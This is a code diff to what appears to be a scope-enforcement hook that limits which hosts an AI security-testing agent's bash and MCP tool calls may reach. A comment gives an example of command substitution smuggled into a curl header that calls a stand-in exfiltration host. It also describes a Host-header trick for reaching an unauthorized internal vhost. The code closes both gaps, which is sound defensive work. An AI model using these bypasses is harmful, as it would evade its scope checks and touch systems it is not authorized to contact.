@@ -129,6 +129,20 @@ TIER2_MCP_SERVERS = {
     # check, so it gets the same real scope-gate every other domain-taking
     # Tier-2 server already does.
     "ad-recon-mcp",
+    # ws-rpc-mcp's call_ddp_method(url, ...) sends a real WebSocket
+    # connection + method call to the live target, same live-target-
+    # touching role as idor-mcp -- registered whole-server (not the
+    # MIXED/TIER2_MCP_TOOLS per-tool pattern case-mcp uses) since this is
+    # this server's PRIMARY purpose, not a named subset of it. Its other
+    # tool, enumerate_ddp_methods(js_file_path), takes no HOST_ARG_KEYS-
+    # matching arg (reads an already-downloaded local file, same contract
+    # as secrets-mcp's scan_directory()/extract_endpoints()) -- whole-
+    # server registration doesn't force a scope check onto it: this
+    # hook's own host-extraction finds no candidates on that call and
+    # passes it through untouched, identical to how idor-mcp's own
+    # whole-server registration never gated a hypothetical local-only
+    # tool on that server either.
+    "ws-rpc-mcp",
 }
 
 # MIXED MCP servers: mostly local (bookkeeping / DB reads), but a NAMED subset
@@ -207,6 +221,36 @@ EMAIL_RE = re.compile(
 # spaces (`-H X-Custom:val`) is not matched -- same "cheap regex scan, not
 # a full shell parser" honesty as this file's other documented limits.
 HEADER_VALUE_RE = re.compile(r"(?:-H|--header)\s+(['\"])(.*?)\1", re.DOTALL)
+
+# Code-review findings #1/#2 (CONFIRMED via direct reproduction): the
+# blanket "blank the whole header-value span" rule above has two bypasses
+# of its own, both closed in _blank_header_value_unless_exempt() below
+# rather than here, since both need to inspect the matched VALUE itself:
+#
+# #1 command substitution: a header value isn't always inert data being
+# sent -- `-H "X-Forwarded-Host: $(curl evil-exfil.com/x)"` embeds a REAL
+# network call inside what looks like a header value, and blanking the
+# whole span hid that call from URL_RE/HOSTNAME_RE entirely, with no
+# audit entry. A value containing `$(` must stay exposed to normal
+# extraction instead of being blanked.
+#
+# #2 Host-header vhost routing: unlike every other header, `Host:`'s
+# value IS the effective request destination for a vhost-routed backend
+# -- `curl https://allowed-corp.com -H "Host: internal-admin.example.org"`
+# connects to allowed-corp.com's IP but the backend routes the request to
+# internal-admin.example.org's vhost. Blanking it let a command target an
+# unauthorized vhost merely by putting it in a Host header instead of the
+# URL. Carved out of the blanket exemption by name, not by shape, since a
+# Host header's value is normally a bare hostname indistinguishable in
+# shape from any other header's value.
+_HOST_HEADER_NAME_RE = re.compile(r"^\s*host\s*:", re.IGNORECASE)
+
+
+def _blank_header_value_unless_exempt(m: re.Match) -> str:
+    value = m.group(2)
+    if _HOST_HEADER_NAME_RE.match(value) or "$(" in value:
+        return m.group(0)
+    return " "
 
 # SAFE_TEST_HOSTS/DEV_INFRA_HOSTS/NON_TLD_FILE_EXTENSIONS and the
 # is_safe_test_host() check itself moved to scope_guard.py 2026-08-29 -- it's
@@ -922,8 +966,11 @@ def _extract_hosts_from_bash(command: str) -> list[str]:
     # Blank out -H/--header flag values before any URL/hostname extraction
     # runs, so a header VALUE (data being sent) is never mistaken for the
     # request's actual destination (data being sent TO) -- see
-    # HEADER_VALUE_RE's own comment for the full rationale.
-    working = HEADER_VALUE_RE.sub(" ", command)
+    # HEADER_VALUE_RE's own comment for the full rationale. Two cases are
+    # exempted from blanking (left exposed to normal extraction below) by
+    # _blank_header_value_unless_exempt(): a command substitution embedded
+    # in the value, and a literal Host header's value.
+    working = HEADER_VALUE_RE.sub(_blank_header_value_unless_exempt, command)
 
     # Prefer real URL parsing over blanket regex where a scheme is present --
     # this is what actually distinguishes "the host curl is contacting" from
